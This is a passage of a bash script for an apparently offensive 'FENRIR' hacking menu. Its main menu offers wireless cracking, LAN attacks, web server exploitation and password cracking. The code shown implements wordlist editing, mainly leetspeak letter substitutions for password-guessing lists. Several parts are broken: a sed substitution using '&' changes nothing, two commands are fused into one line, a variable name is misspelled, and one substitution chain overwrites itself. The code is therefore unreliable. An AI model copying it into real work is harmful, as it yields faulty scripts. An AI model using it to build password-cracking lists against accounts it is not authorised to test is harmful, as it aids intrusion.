		rm -f $HOME/pio.txt
		echo ""

		echo -n "[*] Creating $outname ... "
		timelapsed &
		cat $tmp/wordlistedit1.txt $tmp/wordlistedit2.txt $tmp/wordlistedit3.txt $tmp/wordlistedit4.txt $tmp/wordlistedit5.txt | sort -u >> $out/$outname
		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		echo "[*] Deleting tmp files ... "
		rm -f $tmp/lower.txt
		rm -f $tmp/capitalised.txt
		rm -f $tmp/firstcapitalised.txt
		rm -f $tmp/wordlistedit1.txt
		rm -f $tmp/wordlistedit2.txt
		rm -f $tmp/wordlistedit3.txt
		rm -f $tmp/wordlistedit4.txt
		rm -f $tmp/wordlistedit5.txt

		f_art

		echo "Your Wordlist is in $out/$outname"

		echo ""
		echo ""
		echo -n "Press Any Key To Go Back To The Main Menu : "
		read key
		
		f_return_to_menu

}

	f_substitution () { # a --> @ | e --> & | e --> £ | e --> € | o --> 0 | s --> $ | t --> +  
	
		f_wordlist_a () {
			
			f_art
			
			echo "[*] a ---> @"
			echo ""
			
			echo -n "[*] Working ... "
			timelapsed &
		
			cat $file | sed -e 's/a/@/g' | sort -u >> $out/$outname 
			
			touch $HOME/pio.txt
			sleep 1
			rm -f $HOME/pio.txt
			echo ""
		
			f_art
			
			echo "Your Wordlist is in $out/$outname"
			echo ""
			echo ""
			echo -n "Press Any Key To Go Back To The Main Menu : "
			read key
			
			f_return_to_menu
			
		}
		
		f_wordlist_e_and () {
			
			f_art
			
			echo "[*] e ---> &"
			echo ""
			
			echo -n "[*] Working ... "
			timelapsed &
		
			cat $file | sed -e 's/e/&/g' | sort -u >> $out/$outname 
			
			touch $HOME/pio.txt
			sleep 1
			rm -f $HOME/pio.txt
			echo ""
		
			f_art
			
			echo "Your Wordlist is in $out/$outname"
			echo ""
			echo ""
			echo -n "Press Any Key To Go Back To The Main Menu : "
			read key
			
			f_return_to_menu
			
		}
		
		f_wordlist_e_lyr () {
			
			f_art
			
			echo "[*] e ---> £"
			echo ""
			
			echo -n "[*] Working ... "
			timelapsed &
		
			cat $file | sed -e 's/e/£/g' | sort -u >> $out/$outname 
			
			touch $HOME/pio.txt
			sleep 1
			rm -f $HOME/pio.txt
			echo ""
		
			f_art
			
			echo "Your Wordlist is in $out/$outname"
			echo ""
			echo ""
			echo -n "Press Any Key To Go Back To The Main Menu : "
			read key
			
			f_return_to_menu
			
		}
		
		f_wordlist_e_euro () {
			
			f_art
			
			echo "[*] e ---> €"
			echo ""
			
			echo -n "[*] Working ... "
			timelapsed &
		
			cat $file | sed -e 's/e/€/g' | sort -u >> $out/$outname 
			
			touch $HOME/pio.txt
			sleep 1
			rm -f $HOME/pio.txt
			echo ""
		
			f_art
			
			echo "Your Wordlist is in $out/$outname"
			echo ""
			echo ""
			echo -n "Press Any Key To Go Back To The Main Menu : "
			read key
			
			f_return_to_menu
			
		}
		
		f_wordlist_o () {
			
			f_art
			
			echo "[*] o ---> 0"
			echo ""
			
			echo -n "[*] Working ... "
			timelapsed &
		
			cat $file | sed -e 's/o/0/g' | sort -u >> $out/$outname 
			
			touch $HOME/pio.txt
			sleep 1
			rm -f $HOME/pio.txt
			echo ""
		
			f_art
			
			echo "Your Wordlist is in $out/$outname"
			echo ""
			echo ""
			echo -n "Press Any Key To Go Back To The Main Menu : "
			read key
			
			f_return_to_menu
			
		}
		
		f_wordlist_s () {
			
			f_art
			
			echo "[*] s ---> dollar" | sed -e 's/dollar/$/'
			echo ""
			
			echo -n "[*] Working ... "
			timelapsed &
		
			cat $file | sed -e 's/s/$/g' | sort -u >> $out/$outname 
			
			touch $HOME/pio.txt
			sleep 1
			rm -f $HOME/pio.txt
			echo ""
		
			f_art
			
			echo "Your Wordlist is in $out/$outname"
			echo ""
			echo ""
			echo -n "Press Any Key To Go Back To The Main Menu : "
			read key
			
			f_return_to_menu
			
		}
		
		f_wordlist_t () {
			
			f_art
			
			echo "[*] t ---> +"
			echo ""
			
			echo -n "[*] Working ... "
			timelapsed &
		
			cat $file | sed -e 's/t/+/g' | sort -u >> $out/$outname 
			
			touch $HOME/pio.txt
			sleep 1
			rm -f $HOME/pio.txt
			echo ""
		
			f_art
			
			echo "Your Wordlist is in $out/$outname"
			echo ""
			echo ""
			echo -n "Press Any Key To Go Back To The Main Menu : "
			read key
			
			f_return_to_menu
			
		}
		
		f_wordlist_all_succ () {
			
			f_art
			
			echo "[*] All Substitutions In Succession"
			echo ""
			
			echo "[*] Working ... "
						
			echo -n "a ---> @ "
			timelapsed &
			cat $file | sed -e 's/a/@/g' | sort -u >> $tmp/$outname.a
			touch $HOME/pio.txt
			sleep 1
			rm -f $HOME/pio.txt
			echo ""
			
			echo -n "e ---> & "
			timelapsed &
			cat $file | sed -e 's/e/&/g' | sort -u >> $tmp/$outname.end
			touch $HOME/pio.txt
			sleep 1
			rm -f $HOME/pio.txt
			echo ""
			
			echo -n "e ---> £ "
			timelapsed &
			cat $file | sed -e 's/e/£/g' | sort -u >> $tmp/$outname.lyr
			touch $HOME/pio.txt
			sleep 1
			rm -f $HOME/pio.txt
			echo ""
			
			echo -n "e ---> € "
			timelapsed &
			cat $file | sed -e 's/e/€/g' | sort -u >> $tmp/$outname.euro
			touch $HOME/pio.txt
			sleep 1
			rm -f $HOME/pio.txt
			echo ""
			
			echo -n "o ---> 0 "
			timelapsed &
			cat $file | sed -e 's/o/0/g' | sort -u >> $tmp/$outname.o
			touch $HOME/pio.txt
			sleep 1
			rm -f $HOME/pio.txt
			echo ""
			
			echo -n "s ---> $ "
			timelapsed &
			cat $file | sed -e 's/s/$/g' | sort -u >> $tmp/$outname.stouch $HOME/pio.txt
			sleep 1
			rm -f $HOME/pio.txt
			echo ""
			
			echo -n "t ---> + "
			timelapsed &		
			cat $file | sed -e 's/t/+/g' | sort -u >> $tmp/$outname.t
			touch $HOME/pio.txt
			sleep 1
			rm -f $HOME/pio.txt
			echo ""
			
			echo -n "All (e ---> &) "
			timelapsed &
			cat $file | sed -e 's/a/@/g' | sed -e 's/e/&/g' | sed -e 's/o/0/g' | sed -e 's/s/$/g' | sed -e 's/t/+/g' | sort -u >> $tmp/$outname.all.end
			touch $HOME/pio.txt
			sleep 1
			rm -f $HOME/pio.txt
			echo ""
			
			echo -n "All (e ---> £) "
			timelapsed &
			cat $file | sed -e 's/a/@/g' | sed -e 's/e/£/g' | sed -e 's/e/€/g' | sed -e 's/o/0/g' | sed -e 's/s/$/g' | sed -e 's/t/+/g' | sort -u >> $tmp/$outname.all.lyr
			touch $HOME/pio.txt
			sleep 1
			rm -f $HOME/pio.txt
			echo ""
			
			echo -n "All (e ---> €) "
			timelapsed &
			cat $file | sed -e 's/a/@/g' | sed -e 's/e/€/g' | sed -e 's/o/0/g' | sed -e 's/s/$/g' | sed -e 's/t/+/g' | sort -u >> $tmp/$outname.all.euro
			touch $HOME/pio.txt
			sleep 1
			rm -f $HOME/pio.txt
			echo ""
			
			echo -n "[*] Sorting "
			timelapsed &
			cat $file $tmp/$outname.* | sort -u >> $out/$outname
			touch $HOME/pio.txt
			sleep 1
			rm -f $HOME/pio.txt
			echo ""
			
			rm -f $tmp/$outname.a
			rm -f $tmp/$outname.end
			rm -f $tmp/$outname.lyr
			rm -f $tmp/$outname.euro
			rm -f $tmp/$outname.o
			rm -f $tmp/$outname.s
			rm -f $tmp/$outname.t
			rm -f $tmp/$outname.all.end
			rm -f $tmp/$outname.all.lyr
			rm -f $tmp/$outname.all.euro
			
			f_art
			
			echo "Your Wordlist is in $out/$outname"
			echo ""
			echo ""
			echo -n "Press Any Key To Go Back To The Main Menu : "
			read key
			
			f_return_to_menu
			
		}
		
		f_wordlist_all_tog () {
			
			f_art
			
			echo "[*] All Substitutions Toghether"
			echo ""
			
			echo -n "[*] Working ... "
			timelapsed &
		
			cat $file | sed -e 's/a/@/g' | sed -e 's/e/&/g' | sed -e 's/o/0/g' | sed -e 's/s/$/g' | sed -e 's/t/+/g' | sort -u >> $tmp/$outname.end
			cat $file | sed -e 's/a/@/g' | sed -e 's/e/£/g' | sed -e 's/e/€/g' | sed -e 's/o/0/g' | sed -e 's/s/$/g' | sed -e 's/t/+/g' | sort -u >> $tmp/$outname.lyr
			cat $file | sed -e 's/a/@/g' | sed -e 's/e/€/g' | sed -e 's/o/0/g' | sed -e 's/s/$/g' | sed -e 's/t/+/g' | sort -u >> $tmp/$outname.euro
			
			cat $file $tmp/$outname* | sort -u >> $out/$outname
			
			rm -f $tmp/$outname.end
			rm -f $tmp/$outname.lyr
			rm -f $tmp/$outname.euro
			
			touch $HOME/pio.txt
			sleep 1
			rm -f $HOME/pio.txt
			echo ""
		
			f_art
			
			echo "Your Wordlist is in $out/$outname"
			echo ""
			echo ""
			echo -n "Press Any Key To Go Back To The Main Menu : "
			read key
			
			f_return_to_menu
			
		}
		
		
		substitution_cho=0
		a=1
		e_and=2
		e_lyr=3
		e_euro=4
		o=5
		s=6
		t=7
		all_sub_succ=8
		all_sub_tog=9
		menu=10
		until [ $substitution_cho == $a ] || [ $substitution_cho == $e_and ] ||  [ $substitution_cho == $e_lyr ] || [ $substitution_cho == $e_euro ] || [ $substitution_cho == $o ] || [ $substitution_cho == $s ] || [ $substitution_cho == $t ] || [ $substitution_cho == $all_sub_succ ] || [ $substitution_cho == $all_sub_tog ] || [ $substitution_cho == $menu ]; do
			f_art
			echo "Select Option (Sort Automated) : "
			echo ""
			echo "1) a ---> @"
			echo "2) e ---> &"
			echo "3) e ---> £"
			echo "4) e ---> €"
			echo "5) o ---> 0"
			echo "6) s ---> dollar" | sed -e 's/dollar/$/'
			echo "7) t ---> +"
			echo "8) All Substitution In succession (tom --> +om | t0m | +0m)"
			echo "9) All Substitution Toghether (tom --> +0m )"
			echo "10) Main Menu"
			echo ""
			echo -n "Choice : "
			read substitution_cho
		done
		
		if [ $substitution_cho != $menu ]; then
			f_art
			
			echo -n "Select the input file path (es: /home/user/wordlist.txt) : "
			read file
			
			echo ""
			
			echo -n "Select the output dir (es: /home/user) : "
			read out
			
			echo ""
			
			echo -n "Select the output file name (es: wordlistedited.txt) : "
			read outname

			if [ $substitution_cho == $all_sub_succ ] || [ $substition_cho == $all_sub_tog]; then
				echo ""
				echo -n "Select the tmp dir (es: /tmp) : "
				read tmp
			fi
		fi
		
		case $substitution_cho in
		
		# a --> @
		1) 	f_wordlist_a ;;
			
		# e --> &	
		2) 	f_wordlist_e_and ;;
			
		# e --> £	
		3) 	f_wordlist_e_lyr ;;
			
		# e --> €	
		4)  f_wordlist_e_euro ;;
		
		# o --> 0
		5)  f_wordlist_o ;;
			
		# s --> $
		6) 	f_wordlist_s ;;
			
		# t --> +
		7) 	f_wordlist_t ;;
					
		# all succ
		8)  f_wordlist_all_succ ;;
		
		# all tog	
		9) f_wordlist_all_tog ;;
		
		# Menu
		10) f_return_to_menu ;;
		
		esac
						
	}

	wordlist_cho=0
	low=1
	cap=2
	capfirst=3
	spacenull=4
	spacedash=5
	spaceunderscore=6
	spacereturn=7
	wordbegin=8
	wordend=9
	numbegin=10
	numend=11
	all=12
	sub=13
	menu=14
	until [ $wordlist_cho == $low ] || [ $wordlist_cho == $cap ] || [ $wordlist_cho == $capfirst ] || [ $wordlist_cho == $spacenull ] || [ $wordlist_cho == $spacedash ] || [ $wordlist_cho == $spaceunderscore ] || [ $wordlist_cho == $spacereturn ] || [ $wordlist_cho == $wordbegin ] || [ $wordlist_cho == $wordend ] || [ $wordlist_cho == $numbegin ] || [ $wordlist_cho == $numend ] || [ $wordlist_cho == $all ] || [ $wordlist_cho == $sub ] || [ $wordlist_cho == $menu ]; do
		f_art
		echo "Select an Options :"
		echo ""
		echo "1) All letters to lower"
		echo "2) All letter to Capital"
		echo "3) First letter to Capital"
		echo "4) Nullify Spaces"
		echo "5) Spaces to Dash (-)"
		echo "6) Spaces to Underscore (_)"
		echo "7) Spaces to Return"
		echo "8) Add a word of your choosing at the beginning of every line"
		echo "9) Add a word of your choosing at the end of every line"
		echo "10) Numerise the beginning of every line"
		echo "11) Numerise the end of every line"
		echo "12) All: Take a wordlist, capitalise and lowerise it, sort and transform"
        echo "         spaces to null, dash, underscore and return, and merge it all"
        echo "13) Letter Substitution (es a-->@)"
        echo "14) Return To The Main Menu"
		echo ""
		echo -en "Selection : "
		read wordlist_cho
	done


	case $wordlist_cho in

	1) f_low ;;

	2) f_capitalised ;;

	3) f_cap_first ;;

	4) f_spaces_null ;;

	5) f_space_dash ;;

	6) f_spacess_underscore ;;

	7) f_spaces_return ;;

	8) f_add_begin ;;

	9) f_add_end ;;

	10) f_num_begin ;;

	11) f_num_end ;;

	12)	f_all_trasmutation ;;
	
	13) f_substitution ;;
	
	14) f_return_to_menu ;;

	esac

}


##################################################################################

# Menu Function

##################################################################################

f_art () {

clear

echo "

 ####### ####### #     # ######  ### ######
 #       #       ##    # #     #  #  #     #
 #       #       # #   # #     #  #  #     #
 #####   #####   #  #  # ######   #  ######
 #       #       #   # # #   #    #  #   #
 #       #       #    ## #    #   #  #    #
 #       ####### #     # #     # ### #     #

#############################################

 "

}

f_menu () {

hackcho=0
wireless=1
lanattack=2
webattack=3
passwordcracking=4
wordlist=5
exitnow=6
until [ $hackcho == $wireless ] || [ $hackcho == $lanattack ] || [ $hackcho == $webattack ] || [ $hackcho == $passwordcracking ] || [ $hackcho == $wordlist ] || [ $hackcho == $exitnow ]; do
	f_art
	echo "1) Wireless Cracking/Sniffing"
	echo "2) Lan Pentesting"
	echo "3) Exploit an online PC or WebServer"
	echo "4) Password Cracking"
	echo "5) Wordlist Editing"
	echo "6) Exit"
	echo ""
	echo -n "Choice  : "
	read hackcho
done

case $hackcho in

1) 	f_wireless ;;

2) 	f_lanattack ;;

3) 	f_webattack ;;

4) 	f_passwordcracking ;;

5) 	f_wordlist_editing ;;

6) 	f_art
	sleep 1
	echo "Bye"
	sleep 1
	exit 0 ;;

esac

}

if [ "$(id -u)" != "0" ]; then
	sleep 1
	echo "This script must be run as root !!!" 1>&2
	sleep 1
	exit 1
fi

f_menu
